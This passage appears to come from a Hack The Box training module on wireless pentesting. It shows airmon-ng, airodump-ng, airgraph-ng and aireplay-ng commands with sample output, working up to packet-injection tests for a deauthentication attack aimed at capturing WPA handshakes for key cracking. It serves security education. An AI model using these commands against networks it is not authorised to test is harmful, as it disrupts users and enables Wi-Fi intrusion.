+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo airmon-ng <span class="hljs-keyword">check</span>
+
+<span class="hljs-keyword">Found</span> <span class="hljs-number">5</span> processes that could cause trouble.
+<span class="hljs-keyword">If</span> airodump-ng, aireplay-ng <span class="hljs-keyword">or</span> airtun-ng stops working <span class="hljs-keyword">after</span>
+a <span class="hljs-keyword">short</span> <span class="hljs-keyword">period</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">time</span>, you may want <span class="hljs-keyword">to</span> <span class="hljs-keyword">kill</span> (<span class="hljs-keyword">some</span> <span class="hljs-keyword">of</span>) them!
+
+  PID <span class="hljs-keyword">Name</span>
+  <span class="hljs-number">718</span> NetworkManager
+  <span class="hljs-number">870</span> dhclient
+ <span class="hljs-number">1104</span> avahi-daemon
+ <span class="hljs-number">1105</span> avahi-daemon
+ <span class="hljs-number">1115</span> wpa_supplicant
+</code></pre>
+<p>As shown in the above output, there are 5 interfering processes that can cause issues by changing channels or putting the interface back into managed mode. If we encounter problems during our engagement, we can terminate these processes using the airmon-ng check kill command.</p>
+<p>However, it is important to note that this step should only be taken if we are experiencing challenges during the pentesting process.</p>
+<p>  Airmon-ng</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo airmon-ng<span class="hljs-built_in"> check </span>kill
+
+Killing these processes:
+
+  PID Name
+  870 dhclient
+ 1115 wpa_supplicant
+</code></pre>
+<hr>
+<h4 id="starting-monitor-mode-on-a-specific-channel">Starting monitor mode on a specific channel</h4>
+<p>It is also possible to set the wireless card to a specific channel using <code>airmon-ng</code>. We can specify the desired channel while enabling monitor mode on the wlan0 interface.</p>
+<p>  Airmon-ng</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo airmon-ng <span class="hljs-keyword">start</span> wlan0 <span class="hljs-number">11</span>
+
+<span class="hljs-keyword">Found</span> <span class="hljs-number">5</span> processes that could cause trouble.
+<span class="hljs-keyword">If</span> airodump-ng, aireplay-ng <span class="hljs-keyword">or</span> airtun-ng stops working <span class="hljs-keyword">after</span>
+a <span class="hljs-keyword">short</span> <span class="hljs-keyword">period</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">time</span>, you may want <span class="hljs-keyword">to</span> <span class="hljs-keyword">kill</span> (<span class="hljs-keyword">some</span> <span class="hljs-keyword">of</span>) them!
+
+  PID <span class="hljs-keyword">Name</span>
+  <span class="hljs-number">718</span> NetworkManager
+  <span class="hljs-number">870</span> dhclient
+ <span class="hljs-number">1104</span> avahi-daemon
+ <span class="hljs-number">1105</span> avahi-daemon
+ <span class="hljs-number">1115</span> wpa_supplicant
+
+PHY     <span class="hljs-keyword">Interface</span>       Driver          Chipset
+
+phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
+                (mac80211 monitor <span class="hljs-keyword">mode</span> vif enabled <span class="hljs-keyword">for</span> [phy0]wlan0 <span class="hljs-keyword">on</span> [phy0]wlan0mon)
+                (mac80211 station <span class="hljs-keyword">mode</span> vif disabled <span class="hljs-keyword">for</span> [phy0]wlan0)
+</code></pre>
+<p>The above command will set the card into monitor mode on channel 11. This ensures that the <code>wlan0</code> interface operates specifically on channel 11 while in monitor mode.</p>
+<h4 id="stopping-monitor-mode">Stopping monitor mode</h4>
+<p>We can stop the monitor mode on the <code>wlan0mon</code> interface using the command <code>airmon-ng stop wlan0mon</code>.</p>
+<p>  Airmon-ng</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo airmon-ng stop wlan0mon
+
+PHY     Interface       Driver          Chipset
+
+phy0    wlan0mon        rt2800usb       Ralink Technology, Corp. RT2870/RT3070
+                (mac80211 station mode vif enabled on [phy0]wlan0)
+                (mac80211<span class="hljs-built_in"> monitor </span>mode vif disabled for [phy0]wlan0)
+</code></pre>
+<p>We could test to see if our interface is back to managed mode with the iwconfig utility.</p>
+<p>  Airmon-ng</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ iwconfig
+
+wlan0  IEEE <span class="hljs-number">802.11</span>  <span class="hljs-string">Mode:</span>Managed  <span class="hljs-string">Frequency:</span><span class="hljs-number">2.457</span> GHz  Tx-Power=<span class="hljs-number">30</span> dBm   
+          Retry <span class="hljs-keyword">short</span>  <span class="hljs-keyword">long</span> <span class="hljs-string">limit:</span><span class="hljs-number">2</span>   RTS <span class="hljs-string">thr:</span>off   Fragment <span class="hljs-string">thr:</span>off
+          Power <span class="hljs-string">Management:</span>off
+</code></pre>
+<hr>
+<h3 id="moving-on">Moving On</h3>
+<p>In the next section, we will examine the tool airodump-ng. Airodump-ng is used for packet capture, specifically capturing raw 802.11 frames. It generates several files containing detailed information about all detected access points and clients, allowing us to scan for available WiFi networks effectively.</p>
+<p>\</p>
+<hr>
+<h2 id="airodump-ng">Airodump-ng</h2>
+<hr>
+<p>Airodump-ng serves as a tool for capturing packets, specifically targeting raw 802.11 frames. Its primary function lies in the collection of WEP IVs (Initialization Vectors) or WPA/WPA2 handshakes, which are subsequently utilized with aircrack-ng for security assessment purposes.</p>
+<p>Furthermore, airodump-ng generates multiple files containing comprehensive information regarding all identified access points and clients. These files can be harnessed for scripting purposes or the development of personalized tools.</p>
+<p><code>airodump-ng</code> provides a wealth of information when scanning for WiFi networks. The table below explains each field along with its description:</p>
+<table>
+<thead>
+<tr>
+<th><strong>Field</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>BSSID</code></td>
+<td>Shows the MAC address of the access points</td>
+</tr>
+<tr>
+<td><code>PWR</code></td>
+<td>Shows the "power" of the network. The higher the number, the better the signal strength.</td>
+</tr>
+<tr>
+<td><code>Beacons</code></td>
+<td>Shows the number of announcement packets sent by the network.</td>
+</tr>
+<tr>
+<td><code>#Data</code></td>
+<td>Shows the number of captured data packets.</td>
+</tr>
+<tr>
+<td><code>#/s</code></td>
+<td>Shows the number of data packets captured in the past ten seconds.</td>
+</tr>
+<tr>
+<td><code>CH</code></td>
+<td>Shows the "Channel" the network runs on.</td>
+</tr>
+<tr>
+<td><code>MB</code></td>
+<td>Shows the maximum speed supported by the network.</td>
+</tr>
+<tr>
+<td><code>ENC</code></td>
+<td>Shows the encryption method used by the network.</td>
+</tr>
+<tr>
+<td><code>CIPHER</code></td>
+<td>Shows the cipher used by the network.</td>
+</tr>
+<tr>
+<td><code>AUTH</code></td>
+<td>Shows the authentication used by the network.</td>
+</tr>
+<tr>
+<td><code>ESSID</code></td>
+<td>Shows the name of the network.</td>
+</tr>
+<tr>
+<td><code>STATION</code></td>
+<td>Shows the MAC address of the client connected to the network.</td>
+</tr>
+<tr>
+<td><code>RATE</code></td>
+<td>Shows the data transfer rate between the client and the access point.</td>
+</tr>
+<tr>
+<td><code>LOST</code></td>
+<td>Shows the number of data packets lost.</td>
+</tr>
+<tr>
+<td><code>Packets</code></td>
+<td>Shows the number of data packets sent by the client.</td>
+</tr>
+<tr>
+<td><code>Notes</code></td>
+<td>Shows additional information about the client, such as captured EAPOL or PMKID.</td>
+</tr>
+<tr>
+<td><code>PROBES</code></td>
+<td>Shows the list of networks the client is probing for.</td>
+</tr>
+</tbody>
+</table>
+<p>To utilize airodump-ng effectively, the first step is to activate <code>monitor mode</code> on the wireless interface. This mode allows the interface to capture all the wireless traffic in its vicinity. We can use <code>airmon-ng</code> to enable monitor mode on the interface, as shown in the previous section.</p>
+<p>  Airodump-ng</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo airmon-ng start wlan0
+
+Found 2 processes that could cause trouble.
+Kill them using 'airmon-ng<span class="hljs-built_in"> check </span>kill' before putting
+the card in<span class="hljs-built_in"> monitor </span>mode, they will interfere by changing channels<span class="hljs-built_in">
+and </span>sometimes putting the interface back in managed mode
+
+    PID Name
+    559 NetworkManager
+    798 wpa_supplicant
+
+PHY     Interface       Driver          Chipset
+
+phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
+                (mac80211<span class="hljs-built_in"> monitor </span>mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
+                (mac80211 station mode vif disabled for [phy0]wlan0)
+</code></pre>
+<p>  Airodump-ng</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ iwconfig
+
+eth0      no wireless extensions.
+
+wlan0mon  IEEE <span class="hljs-number">802.11</span>  <span class="hljs-string">Mode:</span>Monitor  <span class="hljs-string">Frequency:</span><span class="hljs-number">2.457</span> GHz  Tx-Power=<span class="hljs-number">20</span> dBm   
+          Retry <span class="hljs-keyword">short</span> <span class="hljs-string">limit:</span><span class="hljs-number">7</span>   RTS <span class="hljs-string">thr:</span>off   Fragment <span class="hljs-string">thr:</span>off
+          Power <span class="hljs-string">Management:</span>on
+
+lo        no wireless extensions.
+</code></pre>
+<p>Once Monitor mode is enabled, we can run <code>airodump-ng</code> by specifying the name of the targeted wireless interface, such as <code>airodump-ng wlan0mon</code>. This command prompts airodump-ng to start scanning and collecting data on the wireless access points detectable by the specified interface.</p>
+<p>The output generated by <code>airodump-ng wlan0mon</code> will present a structured table containing detailed information about the identified wireless access points.</p>
+<p>  Airodump-ng</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo airodump-ng wlan0mon
+
+CH <span class="hljs-number"> 9 </span>][ Elapsed:<span class="hljs-number"> 1 </span>min ][ 2007-04-26 17:41 ][
+
+ BSSID              PWR RXQ  Beacons    <span class="hljs-comment">#Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID</span>
+
+ 00:09:5B:1C:AA:1D  <span class="hljs-number"> 11 </span><span class="hljs-number"> 16 </span>     <span class="hljs-number"> 10 </span>      <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span><span class="hljs-number"> 11 </span> 54.  OPN              NETGEAR                         
+ 00:14:6C:7A:41:81  <span class="hljs-number"> 34 </span>100      <span class="hljs-number"> 57 </span>     <span class="hljs-number"> 14 </span>  <span class="hljs-number"> 1 </span><span class="hljs-number"> 48 </span> 11e  WEP  WEP         bigbear 
+ 00:14:6C:7E:40:80  <span class="hljs-number"> 32 </span>100     <span class="hljs-number"> 752 </span>     <span class="hljs-number"> 73 </span>  <span class="hljs-number"> 2 </span> <span class="hljs-number"> 9 </span><span class="hljs-number"> 54 </span>  WPA  TKIP   PSK  teddy                             
+
+ BSSID              STATION            PWR   Rate   Lost  Frames   Notes  Probes
+
+ 00:14:6C:7A:41:81  00:0F:B5:32:31:31  <span class="hljs-number"> 51 </span>  36-24   <span class="hljs-number"> 2 </span>     <span class="hljs-number"> 14 </span>          bigbear 
+ (not associated)   00:14:A4:3F:8D:13  <span class="hljs-number"> 19 </span>   0-0    <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 4 </span>          mossy 
+ 00:14:6C:7A:41:81  00:0C:41:52:D1:D1   -1   36-36   <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 5 </span>          bigbear 
+ 00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2  <span class="hljs-number"> 35 </span>  54-54   <span class="hljs-number"> 0 </span>     <span class="hljs-number"> 99 </span>          teddy
+</code></pre>
+<p>From the above output, we can see that there are three available WiFi networks or access points (APs): <code>NETGEAR</code>, <code>bigbear</code>, and <code>teddy</code>. NETGEAR has the BSSID <code>00:09:5B:1C:AA:1D</code> and uses OPN (open) encryption. Bigbear has the BSSID <code>00:14:6C:7A:41:81</code> and uses WEP encryption. Teddy has the BSSID <code>00:14:6C:7E:40:80</code> and uses WPA encryption.</p>
+<p>The stations shown below represent the clients connected to the WiFi network. By checking the station ID along with the BSSID, we can determine which client is connected to which WiFi network. For example, the client with station ID <code>00:0F:B5:FD:FB:C2</code> is connected to the <code>teddy</code> network.</p>
+<hr>
+<h4 id="scanning-specific-channels-or-a-single-channel">Scanning Specific Channels or a Single Channel</h4>
+<p>The command <code>airodump-ng wlan0mon</code> initiates a comprehensive scan, collecting data on wireless access points across all the <code>channels</code> available. However, we can specify a particular channel using the <code>-c</code> option to focus the scan on a specific frequency. For instance, <code>-c 11</code> would narrow the scan to <code>channel 11</code>. This targeted approach can provide more refined results, especially in crowded Wi-Fi environments.</p>
+<p>Example of a single channel:</p>
+<p>  Airodump-ng</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo airodump-ng -c<span class="hljs-number"> 11 </span>wlan0mon
+
+CH <span class="hljs-number"> 11 </span>][ Elapsed:<span class="hljs-number"> 1 </span>min ][ 2024-05-18 17:41 ][
+
+ BSSID              PWR RXQ  Beacons    <span class="hljs-comment">#Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID</span>
+
+ 00:09:5B:1C:AA:1D  <span class="hljs-number"> 11 </span><span class="hljs-number"> 16 </span>     <span class="hljs-number"> 10 </span>      <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span><span class="hljs-number"> 11 </span> 54.  OPN              NETGEAR                         
+
+ BSSID              STATION            PWR   Rate   Lost  Frames  Notes  Probes
+
+ (not associated)   00:0F:B5:32:31:31  -29   <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 42 </span>       4
+ (not associated)   00:14:A4:3F:8D:13  -29   <span class="hljs-number"> 0 </span>     <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 4 </span>           
+ (not associated)   00:0C:41:52:D1:D1  -29   <span class="hljs-number"> 0 </span>     <span class="hljs-number"> 0 </span>       5
+ (not associated)   00:0F:B5:FD:FB:C2  -29   <span class="hljs-number"> 0 </span>     <span class="hljs-number"> 0 </span>      22
+</code></pre>
+<p>It is also possible to select multiple channels for scanning using the command <code>airodump-ng -c 1,6,11 wlan0mon</code>.</p>
+<hr>
+<h4 id="scanning-5-ghz-wi-fi-bands">Scanning 5 GHz Wi-Fi bands</h4>
+<p>By default, airodump-ng is configured to scan exclusively for networks operating on the 2.4 GHz band. Nevertheless, if the wireless adapter is compatible with the 5 GHz band, we can instruct airodump-ng to include this frequency range in its scan by utilizing the <code>--band</code> option. You can find a list of all WLAN channels and bands available for Wi-Fi <a href="https://en.wikipedia.org/wiki/List_of_WLAN_channels">here</a>.</p>
+<p>The supported bands are a, b, and g.</p>
+<ul>
+<li><code>a</code> uses 5 GHz</li>
+<li><code>b</code> uses 2.4 GHz</li>
+<li><code>g</code> uses 2.4 GHz</li>
+</ul>
+<p>  Airodump-ng</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo airodump-ng wlan0mon --band a
+
+CH <span class="hljs-number"> 48 </span>][ Elapsed:<span class="hljs-number"> 1 </span>min ][ 2024-05-18 17:41 ][ 
+
+ BSSID              PWR RXQ  Beacons    <span class="hljs-comment">#Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID</span>
+
+ 00:14:6C:7A:41:81  <span class="hljs-number"> 34 </span>100      <span class="hljs-number"> 57 </span>     <span class="hljs-number"> 14 </span>  <span class="hljs-number"> 1 </span><span class="hljs-number"> 48 </span> 11e  WPA  TKIP        HTB                         
+
+BSSID              STATION            PWR   Rate   Lost  Frames  Notes  Probes
+
+ (not associated)   00:0F:B5:32:31:31  -29   <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 42 </span>       4
+ (not associated)   00:14:A4:3F:8D:13  -29   <span class="hljs-number"> 0 </span>     <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 4 </span>           
+ (not associated)   00:0C:41:52:D1:D1  -29   <span class="hljs-number"> 0 </span>     <span class="hljs-number"> 0 </span>       5
+ (not associated)   00:0F:B5:FD:FB:C2  -29   <span class="hljs-number"> 0 </span>     <span class="hljs-number"> 0 </span>      22
+</code></pre>
+<p>When employing the <code>--band</code> option, we have the flexibility to specify either a single band or a combination of bands according to our scanning needs. For instance, to scan across all available bands, we can execute the command <code>airodump-ng --band abg wlan0mon</code>. This command instructs airodump-ng to scan for networks across the <code>a</code>, <code>b</code>, and <code>g</code> bands simultaneously, providing a comprehensive overview of the wireless landscape accessible to the specified wireless interface, wlan0mon.</p>
+<hr>
+<h4 id="saving-the-output-to-a-file">Saving the output to a file</h4>
+<p>We can preserve the outcomes of our <code>airodump-ng</code> scan by utilizing the <code>--write &lt;prefix&gt;</code> parameter. This action generates multiple files with the specified prefix filename. For instance, executing <code>airodump-ng wlan0mon --write HTB</code> will generate the following files in the current directory.</p>
+<ul>
+<li>HTB-01.cap</li>
+<li>HTB-01.csv</li>
+<li>HTB-01.kismet.csv</li>
+<li>HTB-01.kismet.netxml</li>
+<li>HTB-01.log.csv</li>
+</ul>
+<p>  Airodump-ng</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo airodump-ng wlan0mon -w HTB
+
+11:32:13  Created capture file "HTB-01.cap".
+
+CH <span class="hljs-number"> 9 </span>][ Elapsed:<span class="hljs-number"> 1 </span>min ][ 2007-04-26 17:41 ][
+
+ BSSID              PWR RXQ  Beacons    <span class="hljs-comment">#Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID</span>
+
+ 00:09:5B:1C:AA:1D  <span class="hljs-number"> 11 </span><span class="hljs-number"> 16 </span>     <span class="hljs-number"> 10 </span>      <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span><span class="hljs-number"> 11 </span> 54.  OPN              NETGEAR                         
+ 00:14:6C:7A:41:81  <span class="hljs-number"> 34 </span>100      <span class="hljs-number"> 57 </span>     <span class="hljs-number"> 14 </span>  <span class="hljs-number"> 1 </span><span class="hljs-number"> 48 </span> 11e  WEP  WEP         bigbear 
+ 00:14:6C:7E:40:80  <span class="hljs-number"> 32 </span>100     <span class="hljs-number"> 752 </span>     <span class="hljs-number"> 73 </span>  <span class="hljs-number"> 2 </span> <span class="hljs-number"> 9 </span><span class="hljs-number"> 54 </span>  WPA  TKIP   PSK  teddy                             
+
+ BSSID              STATION            PWR   Rate   Lost  Frames   Notes  Probes
+
+ 00:14:6C:7A:41:81  00:0F:B5:32:31:31  <span class="hljs-number"> 51 </span>  36-24   <span class="hljs-number"> 2 </span>     <span class="hljs-number"> 14 </span>          bigbear 
+ (not associated)   00:14:A4:3F:8D:13  <span class="hljs-number"> 19 </span>   0-0    <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 4 </span>          mossy 
+ 00:14:6C:7A:41:81  00:0C:41:52:D1:D1   -1   36-36   <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 5 </span>          bigbear 
+ 00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2  <span class="hljs-number"> 35 </span>  54-54   <span class="hljs-number"> 0 </span>     <span class="hljs-number"> 99 </span>          teddy
+</code></pre>
+<p>Every time airodump-ng is executed with the command to capture either IVs (Initialization Vectors) or complete packets, it generates additional text files that are saved onto the disk. These files share the same name with the original output and are differentiated by suffixes: ".csv" for CSV files, ".kismet.csv" for Kismet CSV files, and ".kismet.netxml" for Kismet newcore netxml files. These generated files serve different purposes, facilitating diverse forms of data analysis and compatibility with various network analysis tools.</p>
+<p>  Airodump-ng</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ ls
+
+HTB-<span class="hljs-number">01</span><span class="hljs-selector-class">.csv</span>   HTB-<span class="hljs-number">01</span><span class="hljs-selector-class">.kismet</span><span class="hljs-selector-class">.netxml</span>   HTB-<span class="hljs-number">01</span><span class="hljs-selector-class">.cap</span>   HTB-<span class="hljs-number">01</span><span class="hljs-selector-class">.kismet</span><span class="hljs-selector-class">.csv</span>   HTB-<span class="hljs-number">01</span><span class="hljs-selector-class">.log</span><span class="hljs-selector-class">.csv</span>
+</code></pre>
+<hr>
+<h3 id="moving-on">Moving On</h3>
+<p>In the next section, we'll explore how to interpret these files visually, allowing us to observe the available Access Points (APs) and clients in a graphical representation. This visual analysis enhances our understanding of the network environment by presenting data in a more intuitive format.</p>
+<hr>
+<h2 id="airgraph-ng">Airgraph-ng</h2>
+<hr>
+<p><code>Airgraph-ng</code> is a Python script designed for generating graphical representations of wireless networks using the CSV files produced by <code>Airodump-ng</code>. These CSV files from Airodump-ng capture essential data regarding the associations between wireless clients and Access Points (APs), as well as the inventory of probed networks. Airgraph-ng processes these CSV files to produce two distinct types of graphs:</p>
+<ul>
+<li>Clients to AP Relationship Graph: This graph illustrates the connections between wireless clients and Access Points, providing insights into the network topology and the interactions between devices.</li>
+<li>Clients Probe Graph: This graph showcases the probed networks by wireless clients, offering a visual depiction of the networks scanned and potentially accessed by these devices.</li>
+</ul>
+<p>By leveraging Airgraph-ng, users can visualize and analyze the relationships and interactions within wireless networks, aiding in network troubleshooting, optimization, and security assessment.</p>
+<hr>
+<h4 id="clients-to-ap-relationship-graph">Clients to AP Relationship Graph</h4>
+<p>The Clients to AP Relationship (CAPR) graph illustrates the connections between clients and access points (APs). Since this graph emphasizes clients, it will not display any APs without connected clients.</p>
+<p>The access points are color-coded based on their encryption type:</p>
+<ul>
+<li>Green for WPA</li>
+<li>Yellow for WEP</li>
+<li>Red for open networks</li>
+<li>Black for unknown encryption.</li>
+</ul>
+<p>  Airgraph-ng</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo airgraph-ng -i HTB<span class="hljs-number">-01.</span>csv -g CAPR -o HTB_CAPR.png
+
+**** WARNING Images can be large, up <span class="hljs-built_in">to</span> <span class="hljs-number">12</span> Feet <span class="hljs-keyword">by</span> <span class="hljs-number">12</span> Feet****
+Creating your Graph <span class="hljs-keyword">using</span>, HTB<span class="hljs-number">-01.</span>csv <span class="hljs-keyword">and</span> writing <span class="hljs-built_in">to</span>, HTB_CAPR.png
+Depending <span class="hljs-keyword">on</span> <span class="hljs-title">your</span> <span class="hljs-title">system</span> <span class="hljs-title">this</span> <span class="hljs-title">can</span> <span class="hljs-title">take</span> <span class="hljs-title">a</span> <span class="hljs-title">bit</span>. <span class="hljs-title">Please</span> <span class="hljs-title">standby</span>......
+</code></pre>
+<p><img src="storage\modules\222\graph\HTB_CAPR.png" alt="Airgraph-ng diagram showing one access point 'CyberNet-Secure' with one client, displaying details like encryption WPA2 and timestamps."></p>
+<p>The <code>HTB-01.csv</code> file can be obtained using the <code>airodump-ng -w HTB</code> command as shown in previous section.</p>
+<hr>
+<h4 id="common-probe-graph">Common Probe Graph</h4>
+<p>The Common Probe Graph (CPG) in Airgraph-ng visualizes the relationships between wireless clients and the access points (APs) they probe for. It shows which APs each client is trying to connect to by displaying the probes sent out by the clients. This graph helps identify which clients are probing for which networks, even if they are not currently connected to any AP.</p>
+<p>  Airgraph-ng</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo airgraph-ng -i HTB<span class="hljs-number">-01.</span>csv -g CPG -o HTB_CPG.png
+
+**** WARNING Images can be large, up <span class="hljs-built_in">to</span> <span class="hljs-number">12</span> Feet <span class="hljs-keyword">by</span> <span class="hljs-number">12</span> Feet****
+Creating your Graph <span class="hljs-keyword">using</span>, HTB<span class="hljs-number">-01.</span>csv <span class="hljs-keyword">and</span> writing <span class="hljs-built_in">to</span>, HTB_CPG.png
+Depending <span class="hljs-keyword">on</span> <span class="hljs-title">your</span> <span class="hljs-title">system</span> <span class="hljs-title">this</span> <span class="hljs-title">can</span> <span class="hljs-title">take</span> <span class="hljs-title">a</span> <span class="hljs-title">bit</span>. <span class="hljs-title">Please</span> <span class="hljs-title">standby</span>......
+</code></pre>
+<p><img src="storage\modules\222\graph\HTB_CPG.png" alt="Airgraph-ng diagram showing one probe from 'CyberNet-Secure' to a client with unknown OUI and device type, displaying timestamps."></p>
+<hr>
+<h3 id="moving-on">Moving On</h3>
+<p>By leveraging <code>Airgraph-ng</code>, attackers can visualize and analyze the relationships and interactions within wireless networks. This powerful tool provides graphical representations of network connections, enabling a comprehensive understanding of the network's structure. Such insights are invaluable for conducting thorough security assessments and strategically mapping out attack chains. By identifying key nodes and potential vulnerabilities, Airgraph-ng aids in developing more effective strategies for network penetration and defense.</p>
+<p>In the next section, we will explore the <code>aireplay-ng</code> tool. Aireplay-ng is used to generate traffic, making it an essential tool for testing and analyzing wireless networks.</p>
+<hr>
+<h2 id="aireplay-ng">Aireplay-ng</h2>
+<hr>
+<p>The primary function of <a href="https://www.aircrack-ng.org/doku.php?id=aireplay-ng">Aireplay-ng</a> is to generate traffic for later use in aircrack-ng for cracking the WEP and WPA-PSK keys. There are different attacks that can cause deauthentication for the purpose of capturing WPA handshake data, fake authentications, Interactive packet replay, hand-crafted ARP request injection, and ARP-request reinjection. With the packetforge-ng tool it's possible to create arbitrary frames.</p>
+<p>To list all the features of <code>aireplay-ng</code> we use the following command.</p>
+<p>  Aireplay-ng</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ aireplay-ng
+
+ Attack modes (numbers can still be used):
+...
+      -<span class="ruby">-deauth      count : deauthenticate <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> all stations (-<span class="hljs-number">0</span>)
+</span>      -<span class="ruby">-fakeauth    delay : fake authentication with AP (-<span class="hljs-number">1</span>)
+</span>      -<span class="ruby">-interactive       : interactive frame selection (-<span class="hljs-number">2</span>)
+</span>      -<span class="ruby">-arpreplay         : standard ARP-request replay (-<span class="hljs-number">3</span>)
+</span>      -<span class="ruby">-chopchop          : decrypt/chopchop WEP packet (-<span class="hljs-number">4</span>)
+</span>      -<span class="ruby">-fragment          : generates valid keystream   (-<span class="hljs-number">5</span>)
+</span>      -<span class="ruby">-caffe-latte       : query a client <span class="hljs-keyword">for</span> new IVs  (-<span class="hljs-number">6</span>)
+</span>      -<span class="ruby">-cfrag             : fragments against a client  (-<span class="hljs-number">7</span>)
+</span>      -<span class="ruby">-migmode           : attacks WPA migration mode  (-<span class="hljs-number">8</span>)
+</span>      -<span class="ruby">-test              : tests injection <span class="hljs-keyword">and</span> quality (-<span class="hljs-number">9</span>)
+</span>
+      -<span class="ruby">-help              : Displays this usage screen</span>
+</code></pre>
+<p>It currently implements multiple different attacks:</p>
+<table>
+<thead>
+<tr>
+<th><strong>Attack</strong></th>
+<th><strong>Attack Name</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Attack 0</code></td>
+<td>Deauthentication</td>
+</tr>
+<tr>
+<td><code>Attack 1</code></td>
+<td>Fake authentication</td>
+</tr>
+<tr>
+<td><code>Attack 2</code></td>
+<td>Interactive packet replay</td>
+</tr>
+<tr>
+<td><code>Attack 3</code></td>
+<td>ARP request replay attack</td>
+</tr>
+<tr>
+<td><code>Attack 4</code></td>
+<td>KoreK chopchop attack</td>
+</tr>
+<tr>
+<td><code>Attack 5</code></td>
+<td>Fragmentation attack</td>
+</tr>
+<tr>
+<td><code>Attack 6</code></td>
+<td>Cafe-latte attack</td>
+</tr>
+<tr>
+<td><code>Attack 7</code></td>
+<td>Client-oriented fragmentation attack</td>
+</tr>
+<tr>
+<td><code>Attack 8</code></td>
+<td>WPA Migration Mode</td>
+</tr>
+<tr>
+<td><code>Attack 9</code></td>
+<td>Injection test</td>
+</tr>
+</tbody>
+</table>
+<p>As we can see, the flag for deauthentication is <code>-0</code> or <code>--deauth</code>. For this module, we will focus on the <code>deauthentication</code> attack. This attack can be used to disconnect clients from the access point (AP). By using <code>aireplay-ng</code>, we can send <code>deauthentication</code> packets to the AP. The AP will mistakenly believe that these deauthentication requests are coming from the clients themselves, when in fact, we are the ones sending them.</p>
+<hr>
+<h4 id="testing-for-packet-injection">Testing for Packet Injection</h4>
+<p>Before sending deauthentication frames, it's important to verify if our wireless card can successfully inject frames into the target access point (AP). This can be tested by measuring the ping response times from the AP, which gives us an indication of the link quality based on the percentage of responses received. Furthermore, if we are using two wireless cards, this test can help identify which card is more effective for injection attacks.</p>
+<p>Let's enable monitor mode and set the channel for the interface to 1. We can do this using the airmon-ng command <code>airmon-ng start wlan0 1</code>. Alternatively, we can use the <code>iw</code> command to set the channel as follows:</p>
+<p>  Aireplay-ng</p>
+<pre><code class="lang-shell-session">root@htb[/htb]<span class="hljs-symbol">$</span> sudo iw dev wlan0mon <span class="hljs-keyword">set</span> channel <span class="hljs-comment">1</span>
+</code></pre>
+<p>Once we have our interface in monitor mode, it is very easy for us to test it for packet injection. We can utilize Aireplay-ng's test mode as follows.</p>
+<p>  Aireplay-ng</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ sudo aireplay-ng --test wlan0mon
+<span class="hljs-symbol">
+12:</span><span class="hljs-number">34</span>:<span class="hljs-number">56</span>  Trying broadcast probe requests...
+<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">56</span>  Injection is working!
+<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">56</span>  Found <span class="hljs-number">27</span> APs
+<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">56</span>  Trying directed probe requests...
+<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">56</span>   <span class="hljs-number">00</span>:<span class="hljs-number">09</span>:<span class="hljs-number">5</span><span class="hljs-string">B:</span><span class="hljs-number">1</span><span class="hljs-string">C:</span><span class="hljs-string">AA:</span><span class="hljs-number">1</span>D - <span class="hljs-string">channel:</span> <span class="hljs-number">1</span> - <span class="hljs-string">'TOMMY'</span>
+<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">56</span>  Ping (min<span class="hljs-regexp">/avg/</span>max): <span class="hljs-number">0.457</span>ms<span class="hljs-regexp">/1.813ms/</span><span class="hljs-number">2.406</span>ms <span class="hljs-string">Power:</span> <span class="hljs-number">-48.00</span>
+<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">56</span>  <span class="hljs-number">30</span>/<span class="hljs-number">30</span>: <span class="hljs-number">100</span>%
+&lt;SNIP&gt;
+</code></pre>
+<p>If everything is in order, we should see the message <code>Injection is working!</code> This indicates that our interface supports packet injection, and we are ready to use <code>aireplay-ng</code> to perform a deauthentication attack.</p>
+<hr>
